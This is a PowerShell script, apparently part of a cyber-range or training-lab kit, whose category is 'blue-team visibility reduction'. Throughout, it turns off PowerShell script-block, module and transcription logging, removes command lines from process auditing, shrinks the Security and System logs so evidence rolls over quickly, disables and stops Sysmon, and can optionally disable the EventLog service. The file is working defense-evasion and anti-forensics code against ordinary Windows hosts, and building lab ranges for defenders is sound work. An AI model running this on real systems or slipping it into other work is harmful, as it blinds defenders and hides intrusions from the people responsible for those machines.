#requires -Version 5.1
<#  Category: Logging / blue-team visibility reduction

    Turns off PowerShell logging, shrinks the event logs, disables cmdline
    auditing, and neutralizes Sysmon if the blue team deployed it.

    SAFETY: fully disabling the EventLog *service* (Start=4) can prevent Server
    2025 from booting cleanly. It is gated behind Config.DisableEventLogService
    and left OFF by default. Prefer shrinking/retention over killing the service.
#>
param([hashtable]$Config)
$ErrorActionPreference = 'Continue'
if (-not $Config) {
    $d = $PSScriptRoot; while ($d -and -not (Test-Path (Join-Path $d 'modules\RangeCommon.psm1'))) { $d = Split-Path $d -Parent }
    Import-Module (Join-Path $d 'modules\RangeCommon.psm1') -Force
    $Config = Import-PowerShellDataFile (Join-Path $d 'config\range.config.psd1')
    Initialize-RangeContext; Assert-RangeSafety -Config $Config
}
$cat = 'logging-visibility'

# ── PowerShell logging OFF ───────────────────────────────────────────────
$ps = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell'
Set-RegValue "$ps\ScriptBlockLogging" 'EnableScriptBlockLogging' DWord 0 $cat
Set-RegValue "$ps\ModuleLogging"      'EnableModuleLogging'      DWord 0 $cat
Set-RegValue "$ps\Transcription"      'EnableTranscripting'      DWord 0 $cat

# ── cmdline in process-creation events OFF ───────────────────────────────
Set-RegValue 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit' 'ProcessCreationIncludeCmdLine_Enabled' DWord 0 $cat

# ── Shrink Security + System logs so evidence rolls over fast ─────────────
Set-RegValue 'HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security' 'MaxSize' DWord 1048576 $cat
Set-RegValue 'HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System'   'MaxSize' DWord 1048576 $cat
try {
    & "$env:SystemRoot\System32\wevtutil.exe" sl Security /ms:1048576 2>&1 | Out-Null
    & "$env:SystemRoot\System32\wevtutil.exe" sl System   /ms:1048576 2>&1 | Out-Null
} catch {}

# ── Neutralize Sysmon if present ─────────────────────────────────────────
foreach ($svc in 'Sysmon','Sysmon64') {
    if (Get-Service $svc -ErrorAction SilentlyContinue) {
        Set-RegValue "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" 'Start' DWord 4 $cat
        try { Stop-Service $svc -Force -ErrorAction SilentlyContinue } catch {}
        Write-RangeLog "Sysmon service $svc disabled." 'WARN'
    }
}

# ── Optional (dangerous): kill the EventLog service ──────────────────────
if ($Config.DisableEventLogService) {
    Write-RangeLog 'DisableEventLogService=$true -- setting EventLog Start=4. This can break boot on 2025.' 'WARN'
    Set-RegValue 'HKLM:\SYSTEM\CurrentControlSet\Services\EventLog' 'Start' DWord 4 $cat
}

Write-RangeLog 'Logging / visibility category complete.' 'OK'
